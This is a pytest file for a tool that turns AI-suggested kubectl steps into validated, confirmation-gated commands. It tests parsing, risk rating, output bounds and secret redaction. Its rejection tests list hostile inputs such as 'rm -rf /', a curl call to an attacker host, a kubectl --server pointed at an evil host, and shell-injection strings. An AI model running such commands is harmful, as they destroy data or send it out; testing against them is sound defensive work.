"""Tests for Gemini reliability, AI structured output, action validation, and controlled execution."""

from __future__ import annotations

import io
import json
import logging
import sys
from pathlib import Path
from urllib import error, request
from unittest.mock import MagicMock, patch

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from webapp.api.actions import (
    SUPPORTED_ACTIONS,
    build_kubectl_argv,
    execute_action,
    parse_command_to_action,
    validate_namespace,
    validate_resource_name,
)
from webapp.api.ai_summary import (
    _clean_error_message,
    _normalise_steps,
    _parse_summary_response,
    _post_json,
    _retry_delay,
    _strip_json_fence,
)


# ─────────────────────────────────────────────────────────────────────────────
# 1. AI Response Parsing & Structured Output
# ─────────────────────────────────────────────────────────────────────────────

def test_parse_summary_response_valid_json_with_steps():
    raw = json.dumps(
        {
            "summary": "15 connection timeouts to db-1 detected in app namespace.",
            "steps": [
                {
                    "title": "Check database pod status",
                    "command": "kubectl get pod db-1 -n app",
                    "explanation": "Verify pod phase, readiness, and restart count.",
                    "risk": "read-only",
                },
                {
                    "title": "Inspect database logs",
                    "command": "kubectl logs db-1 -n app --tail=100",
                    "explanation": "Check recent connection error messages in database log.",
                    "risk": "read-only",
                },
            ],
        }
    )

    result = _parse_summary_response(raw)

    assert result["summary"] == "15 connection timeouts to db-1 detected in app namespace."
    assert len(result["steps"]) == 2
    step1 = result["steps"][0]
    assert step1["title"] == "Check database pod status"
    assert step1["command"] == "kubectl get pod db-1 -n app"
    assert step1["risk"] == "read-only"
    assert step1["is_supported"] is True
    assert step1["action"]["action"] == "get_pod"
    assert step1["action"]["resource"] == "db-1"
    assert step1["action"]["namespace"] == "app"

    # Compatibility: suggested_action is populated
    assert "kubectl get pod db-1 -n app" in result["suggested_action"]


def test_parse_summary_response_markdown_fence_and_surrounding_text():
    raw = """
Here is the troubleshooting plan:
```json
{
  "summary": "High CPU utilization on web-0 pod.",
  "steps": [
    {
      "title": "Check pod resource status",
      "command": "kubectl describe pod web-0 -n default",
      "explanation": "Check CPU requests and limits.",
      "risk": "read-only"
    }
  ]
}
```
Hope this helps!
"""
    result = _parse_summary_response(raw)
    assert result["summary"] == "High CPU utilization on web-0 pod."
    assert len(result["steps"]) == 1
    assert result["steps"][0]["command"] == "kubectl describe pod web-0 -n default"
    assert result["steps"][0]["is_supported"] is True


def test_parse_summary_response_legacy_fallback():
    raw = json.dumps(
        {
            "summary": "Disk quota exceeded on node-1.",
            "suggested_action": "Check disk space on node-1.",
        }
    )
    result = _parse_summary_response(raw)
    assert result["summary"] == "Disk quota exceeded on node-1."
    assert result["suggested_action"] == "Check disk space on node-1."
    assert len(result["steps"]) == 1
    assert result["steps"][0]["explanation"] == "Check disk space on node-1."
    assert result["steps"][0]["risk"] == "read-only"


def test_normalise_steps_infers_risk_and_caps_steps():
    raw_steps = [
        {"title": "Check pod", "command": "kubectl get pod p1 -n default", "explanation": "Check pod"},
        {"title": "Restart deploy", "command": "kubectl rollout restart deployment/web -n default", "explanation": "Restart"},
        {"title": "Delete pod", "command": "kubectl delete pod p1 -n default", "explanation": "Delete"},
    ]
    normal = _normalise_steps(raw_steps, max_steps=2)
    assert len(normal) == 2
    assert normal[0]["risk"] == "read-only"
    assert normal[1]["risk"] == "medium"


# ─────────────────────────────────────────────────────────────────────────────
# 2. Gemini Reliability, Bounded Retries & Error Sanitization
# ─────────────────────────────────────────────────────────────────────────────

def test_clean_error_message_redacts_api_key():
    secret = "AIzaSyD-1234567890abcdef"
    msg = f"Failed to call https://generativelanguage.googleapis.com?key={secret} with token {secret}"
    cleaned = _clean_error_message(msg, secret)

    assert secret not in cleaned
    assert "***REDACTED***" in cleaned


def test_clean_error_message_parses_google_json_error():
    google_err = json.dumps(
        {
            "error": {
                "code": 429,
                "message": "Resource has been exhausted (e.g. check quota).",
                "status": "RESOURCE_EXHAUSTED",
            }
        }
    )
    cleaned = _clean_error_message(google_err)
    assert cleaned == "Resource has been exhausted (e.g. check quota). (RESOURCE_EXHAUSTED)"


def test_post_json_permanent_error_400_not_retried(monkeypatch):
    calls = []

    def mock_urlopen(req, timeout=0):
        calls.append(req)
        fp = io.BytesIO(b'{"error":{"code":400,"message":"API key not valid."}}')
        raise error.HTTPError(req.full_url, 400, "Bad Request", {"Content-Type": "application/json"}, fp)

    monkeypatch.setattr(request, "urlopen", mock_urlopen)

    with pytest.raises(RuntimeError) as exc_info:
        _post_json(
            provider="Gemini",
            url="https://generativelanguage.googleapis.com/v1beta/test",
            body={"test": True},
            headers={"x-goog-api-key": "secret-key"},
            api_key_to_redact="secret-key",
        )

    # Permanent error must fail immediately after 1 attempt
    assert len(calls) == 1
    assert "HTTP 400" in str(exc_info.value)
    assert "API key not valid." in str(exc_info.value)
    assert "secret-key" not in str(exc_info.value)


def test_post_json_transient_503_retries_and_succeeds(monkeypatch):
    attempts = [0]

    class FakeResponse:
        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

        def read(self, *args):
            return json.dumps({"candidates": [{"content": {"parts": [{"text": "{\"summary\":\"ok\",\"steps\":[]}"}]}}]}).encode("utf-8")

    def mock_urlopen(req, timeout=0):
        attempts[0] += 1
        if attempts[0] < 3:
            fp = io.BytesIO(b'{"error":{"code":503,"message":"Unavailable"}}')
            raise error.HTTPError(req.full_url, 503, "Service Unavailable", {"Retry-After": "0"}, fp)
        return FakeResponse()

    monkeypatch.setattr(request, "urlopen", mock_urlopen)
    monkeypatch.setattr("time.sleep", lambda _: None)

    res = _post_json(
        provider="Gemini",
        url="https://generativelanguage.googleapis.com/v1beta/test",
        body={"test": True},
        headers={"x-goog-api-key": "secret-key"},
        api_key_to_redact="secret-key",
    )

    assert attempts[0] == 3
    assert "candidates" in res


def test_post_json_transient_exhaustion_raises_clean_error(monkeypatch):
    attempts = [0]

    def mock_urlopen(req, timeout=0):
        attempts[0] += 1
        fp = io.BytesIO(b'{"error":{"code":429,"message":"Quota exceeded"}}')
        raise error.HTTPError(req.full_url, 429, "Too Many Requests", {"Retry-After": "0"}, fp)

    monkeypatch.setattr(request, "urlopen", mock_urlopen)
    monkeypatch.setattr("time.sleep", lambda _: None)

    with pytest.raises(RuntimeError) as exc_info:
        _post_json(
            provider="Gemini",
            url="https://generativelanguage.googleapis.com/v1beta/test",
            body={"test": True},
            headers={"x-goog-api-key": "secret-key"},
            api_key_to_redact="secret-key",
        )

    assert attempts[0] == 4  # _MAX_AI_ATTEMPTS
    assert "HTTP 429" in str(exc_info.value)
    assert "Quota exceeded" in str(exc_info.value)


# ─────────────────────────────────────────────────────────────────────────────
# 3. Action Registry & Validation
# ─────────────────────────────────────────────────────────────────────────────

def test_validate_namespace_and_resource():
    assert validate_namespace("default") == "default"
    assert validate_namespace("kube-system") == "kube-system"
    assert validate_namespace("") == ""
    assert validate_namespace(None) == ""

    with pytest.raises(ValueError):
        validate_namespace("invalid_namespace!")
    with pytest.raises(ValueError):
        validate_namespace("ns; rm -rf /")

    assert validate_resource_name("coredns-77c989547b-8ffp8") == "coredns-77c989547b-8ffp8"
    with pytest.raises(ValueError):
        validate_resource_name("pod/../evil")
    with pytest.raises(ValueError):
        validate_resource_name("pod; evil")


def test_parse_command_to_action_supported_diagnostics():
    # get pod
    a1 = parse_command_to_action("kubectl get pod web-0 -n default -o wide")
    assert a1 == {"action": "get_pod", "resource": "web-0", "namespace": "default", "output": "wide"}

    # get pods
    a2 = parse_command_to_action("kubectl get pods -n kube-system")
    assert a2 == {"action": "get_pods", "resource": "", "namespace": "kube-system", "output": ""}

    # describe pod
    a3 = parse_command_to_action("kubectl describe pod web-0 -n default")
    assert a3 == {"action": "describe_pod", "resource": "web-0", "namespace": "default"}

    # pod logs
    a4 = parse_command_to_action("kubectl logs pod/db-1 -n app -c postgres --tail=50")
    assert a4 == {
        "action": "get_pod_logs",
        "resource": "db-1",
        "namespace": "app",
        "container": "postgres",
        "tail": 50,
        "previous": False,
    }

    # events
    a5 = parse_command_to_action("kubectl get events -n default")
    assert a5 == {"action": "get_events", "resource": "", "namespace": "default"}

    # deployment
    a6 = parse_command_to_action("kubectl get deployment nginx -n default")
    assert a6 == {"action": "get_deployment", "resource": "nginx", "namespace": "default", "output": ""}

    # rollout status
    a7 = parse_command_to_action("kubectl rollout status deployment/coredns -n kube-system")
    assert a7 == {"action": "rollout_status", "resource": "coredns", "namespace": "kube-system"}

    # rollout restart (mutating)
    a8 = parse_command_to_action("kubectl rollout restart deployment/nginx -n default")
    assert a8 == {"action": "rollout_restart", "resource": "nginx", "namespace": "default"}


def test_parse_command_rejects_unsafe_arbitrary_commands():
    # Shell execution attempts
    assert parse_command_to_action("rm -rf /") is None
    assert parse_command_to_action("sh -c 'echo pwned'") is None
    assert parse_command_to_action("curl https://attacker.com/leak") is None

    # Unsupported kubectl commands
    assert parse_command_to_action("kubectl exec -it web-0 -- /bin/sh") is None
    assert parse_command_to_action("kubectl delete pod web-0 --all") is None
    assert parse_command_to_action("kubectl edit configmap logging") is None
    assert parse_command_to_action("kubectl run bad-pod --image=evil") is None


def test_build_kubectl_argv_safe_construction():
    argv = build_kubectl_argv({
        "action": "get_pod_logs",
        "resource": "web-0",
        "namespace": "app",
        "container": "nginx",
        "tail": 200,
    })
    assert argv == ["kubectl", "logs", "web-0", "-n", "app", "-c", "nginx", "--tail=200", "--limit-bytes=262144"]


# ─────────────────────────────────────────────────────────────────────────────
# 4. Command Execution & Mutating Confirmation
# ─────────────────────────────────────────────────────────────────────────────

def test_execute_action_mutating_requires_confirmation():
    action = {"action": "rollout_restart", "resource": "nginx", "namespace": "default"}
    # Without confirmation
    res = execute_action(action, confirmed=False)
    assert res["success"] is False
    assert res["requires_confirmation"] is True
    assert "Explicit confirmation is required" in res["message"]

    # With confirmation it runs, without a shell (see _run_command)
    with patch("subprocess.Popen") as mock_popen:
        proc = mock_popen.return_value
        proc.stdout = io.BytesIO(b"deployment.apps/nginx restarted\n")
        proc.stderr = io.BytesIO(b"")
        proc.wait.return_value = 0
        proc.returncode = 0
        res_confirmed = execute_action(action, confirmed=True)
        assert res_confirmed["success"] is True
        assert res_confirmed["exit_code"] == 0
        assert "restarted" in res_confirmed["stdout"]
        mock_popen.assert_called_once()
        args, kwargs = mock_popen.call_args
        assert kwargs["shell"] is False  # Strictly NO shell
        assert args[0] == ["kubectl", "rollout", "restart", "deployment/nginx", "-n", "default"]


def test_execute_action_read_only_runs_without_confirmation():
    action = {"action": "get_pods", "namespace": "kube-system"}
    with patch("webapp.api.actions._run_command", return_value=(0, "NAME STATUS\ncoredns Running\n", "", False, False)):
        res = execute_action(action, confirmed=False)
        assert res["success"] is True
        assert res["exit_code"] == 0
        assert "coredns Running" in res["stdout"]


def test_execute_action_rejects_unregistered_action():
    with pytest.raises(ValueError, match="Unsupported or invalid action"):
        execute_action({"action": "drop_database"})


# ─────────────────────────────────────────────────────────────────────────────
# 5. Audit P1 fixes: what runs is what was confirmed; bounded output; risk
# ─────────────────────────────────────────────────────────────────────────────

from webapp.api.actions import assess_step_risk, describe_action, resolve_action  # noqa: E402
from webapp.api.ai_summary import _call_provider  # noqa: E402
from webapp.api.config import AiConfig  # noqa: E402


def _run_and_capture(payload, confirmed=False, stdout="ok"):
    with patch("webapp.api.actions._run_command", return_value=(0, stdout, "", False, False)) as mock_run:
        res = execute_action(payload, confirmed=confirmed)
    return res, (mock_run.call_args[0][0] if mock_run.called else None)


def test_structured_action_keeps_every_parameter_through_execution():
    parsed = parse_command_to_action("kubectl logs web-0 -n app -c sidecar --previous --tail=50")
    # The UI sends the whole parsed action object; nothing is dropped.
    res, argv = _run_and_capture({"action": parsed, "command": "ignored when action is present"})
    expected = ["kubectl", "logs", "web-0", "-n", "app", "-c", "sidecar", "--tail=50",
                "--limit-bytes=262144", "--previous"]
    assert argv == expected
    assert res["command"] == " ".join(expected)
    # The canonical command reported by validation is the one that runs.
    assert describe_action(resolve_action({"action": parsed}))["command"] == res["command"]


def test_flat_payload_from_older_clients_still_works():
    _, argv = _run_and_capture({"action": "get_pod_logs", "resource": "web-0", "namespace": "app",
                                "container": "nginx", "tail": "20"})
    assert argv == ["kubectl", "logs", "web-0", "-n", "app", "-c", "nginx", "--tail=20", "--limit-bytes=262144"]


def test_pod_logs_are_always_bounded():
    base = {"action": "get_pod_logs", "resource": "web-0"}
    assert build_kubectl_argv(base)[-2:] == ["--tail=100", "--limit-bytes=262144"]          # default
    assert "--tail=1000" in build_kubectl_argv({**base, "tail": 10_000_000})                  # clamped
    assert "--tail=100" in build_kubectl_argv({**base, "tail": "lots"})                       # invalid
    assert "--previous" not in build_kubectl_argv({**base, "previous": "false"})              # string false
    assert "--previous" in build_kubectl_argv({**base, "previous": True})


def test_command_output_is_capped():
    res, _ = _run_and_capture({"action": "get_pods"}, stdout="x" * (300 * 1024))
    assert res["output_truncated"] is True
    assert len(res["stdout"]) < 300 * 1024 and res["stdout"].endswith("characters]")
    res, _ = _run_and_capture({"action": "get_pods"}, stdout="short")
    assert res["output_truncated"] is False and res["stdout"] == "short"


def test_confirmation_response_names_the_exact_command():
    res, argv = _run_and_capture({"command": "kubectl rollout undo deploy/web -n app"})
    assert argv is None and res["requires_confirmation"] is True
    assert res["command"] == "kubectl rollout undo deployment/web -n app"
    assert res["structured"] == {"action": "rollout_undo", "resource": "web", "namespace": "app"}
    # A state-changing command is never run with part of it left out: undo
    # without --to-revision rolls back to a different revision.
    with pytest.raises(ValueError, match="Unsupported"):
        execute_action({"command": "kubectl rollout undo deploy/web -n app --to-revision=3"}, confirmed=True)


def test_risk_is_derived_server_side_and_ai_labels_cannot_lower_it():
    assert assess_step_risk("kubectl delete namespace prod", "read-only") == "high"
    assert assess_step_risk("kubectl rollout restart deployment/web -n app", "safe") == "medium"
    assert assess_step_risk("kubectl get pods -n app", "high") == "high"          # may raise
    assert assess_step_risk("kubectl get pods -n app", "read-only") == "read-only"
    assert assess_step_risk("kubectl get pods -n app", None) == "read-only"
    assert assess_step_risk("helm uninstall web", "nonsense") == "read-only"   # unknown, no keyword
    assert assess_step_risk("kubectl scale deploy/web --replicas=0", "read-only") == "medium"


def test_normalised_steps_carry_exec_command_and_support_flags():
    steps = _normalise_steps([
        {"title": "a", "command": "kubectl get pods -A -n app", "risk": "read-only"},
        {"title": "b", "command": "kubectl get pod Bad_Name", "risk": "read-only"},
        {"title": "c", "command": "kubectl delete pod web-0", "risk": "read-only"},
    ], max_steps=5)
    assert steps[0]["is_supported"] is True and steps[0]["exec_command"] == "kubectl get pods -n app"
    assert steps[0]["ignored_args"] == ["-A"]
    assert steps[1]["is_supported"] is False and "Invalid resource name" in steps[1]["unsupported_reason"]
    assert steps[2]["is_supported"] is False and steps[2]["risk"] == "high"


def test_malformed_provider_payload_becomes_a_provider_error(monkeypatch):
    cfg = AiConfig(provider="openai", model="m", api_key_env="K", max_anomalies_per_tick=1, reasoning_effort="medium")

    class _Resp(io.BytesIO):
        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

    for body in (b"<html>oops</html>", json.dumps({"choices": ["not-a-dict"]}).encode()):
        monkeypatch.setattr(request, "urlopen", lambda req, timeout=0, b=body: _Resp(b))
        with pytest.raises(RuntimeError, match="malformed response"):
            _call_provider("openai", {"x": 1}, "m", "key", cfg, "system")


@pytest.mark.parametrize("command", [
    "kubectl get pods -n app; rm -rf /",
    "kubectl get pods -n app --sort-by=$(rm -rf ~)",
    "kubectl get pods | xargs kubectl delete pod",
    "kubectl logs web-0 && kubectl delete ns prod",
    "kubectl get pods > /etc/passwd",
    "kubectl get pods `id`",
])
def test_shell_syntax_is_never_runnable_and_always_high_risk(command):
    """Only part of such a command would run, while the card shows all of it;
    a pasted copy would run everything. It is rejected and rated high."""
    assert parse_command_to_action(command) is None
    assert assess_step_risk(command, "read-only") == "high"
    [step] = _normalise_steps([{"title": "t", "command": command, "risk": "read-only"}], max_steps=1)
    assert step["is_supported"] is False and step["risk"] == "high"
    with pytest.raises(ValueError):
        execute_action({"command": command}, confirmed=True)


# ─────────────────────────────────────────────────────────────────────────────
# 6. Adversarial parsing, confirmation binding and bounded execution
# ─────────────────────────────────────────────────────────────────────────────

import os  # noqa: E402
import threading  # noqa: E402

from webapp.api.actions import (  # noqa: E402
    ActionBusy,
    ActionGate,
    ConfirmationTokens,
    _run_command,
    step_execution_fields,
)


def _parse_with_deadline(command, seconds=2.0):
    result = {}
    worker = threading.Thread(target=lambda: result.update(value=parse_command_to_action(command)), daemon=True)
    worker.start()
    worker.join(seconds)
    assert not worker.is_alive(), f"parser did not terminate for {command!r}"
    return result["value"]


@pytest.mark.parametrize("command", [
    "kubectl get pods -n", "kubectl get pods -o", "kubectl logs web-0 -c", "kubectl logs web-0 --tail",
    "kubectl get pods --namespace", "kubectl get pods -l", "kubectl -n",
])
def test_flag_without_value_is_rejected_and_never_hangs(command):
    assert _parse_with_deadline(command) is None
    assert assess_step_risk(command) in ("read-only", "medium", "high")  # also terminates


@pytest.mark.parametrize("command", [
    "kubectl get pods foo bar",                              # extra word would be dropped
    "kubectl logs --since 1h web-0 sidecar extra",
    "kubectl logs deployment/web",                           # kubectl would pick a pod
    "kubectl rollout restart web",                           # not a valid kubectl target
    "kubectl rollout restart statefulset/db",
    "kubectl rollout restart deployment/web --dry-run=client",  # would really restart
    "kubectl rollout undo deployment/web --to-revision=2",      # would undo to another revision
    "kubectl rollout restart deployment/web -A",
    "kubectl rollout restart deployment/web -o yaml",
    "kubectl --context prod get pods",                       # different cluster
    "kubectl --kubeconfig /tmp/other get pods",
    "kubectl --server https://evil.example get pods",
    "kubectl --as system:admin get pods",
    "kubectl get pods --token=abc",
    "kubectl get -f manifest.yaml",
    "kubectl -nfoo get pods",
    "kubectl get pods -- rm",
    "kubectl logs web-0 sidecar -c other",
    "kubectl logs web-0 --tail=lots",
    "kubectl get pods " + "x" * 3000,
])
def test_commands_that_cannot_run_exactly_as_shown_are_unsupported(command):
    assert _parse_with_deadline(command) is None
    fields = step_execution_fields(command, "read-only")
    assert fields["is_supported"] is False and fields["action"] is None and fields["exec_command"] == ""
    assert fields["unsupported_reason"]
    with pytest.raises(ValueError):
        execute_action({"command": command}, confirmed=True)


def test_equivalent_spellings_map_to_the_command_they_name():
    restart = describe_action(resolve_action({"command": "kubectl rollout restart deployment web -n app"}))
    assert restart["command"] == "kubectl rollout restart deployment/web -n app"
    logs = describe_action(resolve_action({"command": "kubectl logs -f pod/web-0 sidecar -n app -p --tail=-1"}))
    assert logs["argv"] == ["kubectl", "logs", "web-0", "-n", "app", "-c", "sidecar", "--tail=1000",
                            "--limit-bytes=262144", "--previous"]
    assert logs["ignored_args"] == ["-f"]
    get = describe_action(resolve_action({"command": "kubectl get po/web-0 -n app -o jsonpath={.status}"}))
    assert get["command"] == "kubectl get pod web-0 -n app" and get["ignored_args"] == ["-o", "jsonpath={.status}"]


def test_confirmation_tokens_bind_one_exact_command_once():
    tokens = ConfirmationTokens(ttl_secs=60)
    argv = ["kubectl", "rollout", "restart", "deployment/web", "-n", "app"]
    token = tokens.issue(argv)
    assert not tokens.consume(token, argv[:-1] + ["prod"])     # different command
    assert tokens.consume(token, argv)
    assert not tokens.consume(token, argv)                       # single use
    assert not tokens.consume("1.2.3", argv) and not tokens.consume(None, argv)
    expired = ConfirmationTokens(ttl_secs=-1)
    assert not expired.consume(expired.issue(argv), argv)
    forged_expiry = token.split(".")
    assert not tokens.consume(".".join([str(int(forged_expiry[0]) + 999), *forged_expiry[1:]]), argv)


def test_action_gate_rejects_duplicates_and_bounds_concurrency():
    gate = ActionGate(max_concurrent=2)
    with gate.slot(["kubectl", "get", "pods"]):
        with pytest.raises(ActionBusy, match="already running"):
            with gate.slot(["kubectl", "get", "pods"]):
                pass
        with gate.slot(["kubectl", "get", "events"]):
            with pytest.raises(ActionBusy, match="actions are already running"):
                with gate.slot(["kubectl", "describe", "pod", "x"]):
                    pass
    with gate.slot(["kubectl", "get", "pods"]):  # released afterwards
        pass


def test_command_runner_bounds_output_time_and_environment(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "sk-should-not-leak")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "aws-should-not-leak")
    code, out, err, limited, timed_out = _run_command(
        [sys.executable, "-c", "import os; print(sorted(k for k in os.environ if 'KEY' in k))"],
        timeout=10, max_bytes=4096,
    )
    assert code == 0 and out.strip() == "[]" and not limited and not timed_out
    code, out, _, limited, _ = _run_command(
        [sys.executable, "-c", "import sys\nwhile True: sys.stdout.write('x' * 65536)"],
        timeout=10, max_bytes=100_000,
    )
    assert limited and len(out) == 100_000 and code != 0
    _, _, _, _, timed_out = _run_command([sys.executable, "-c", "import time; time.sleep(30)"],
                                         timeout=0.5, max_bytes=1000)
    assert timed_out
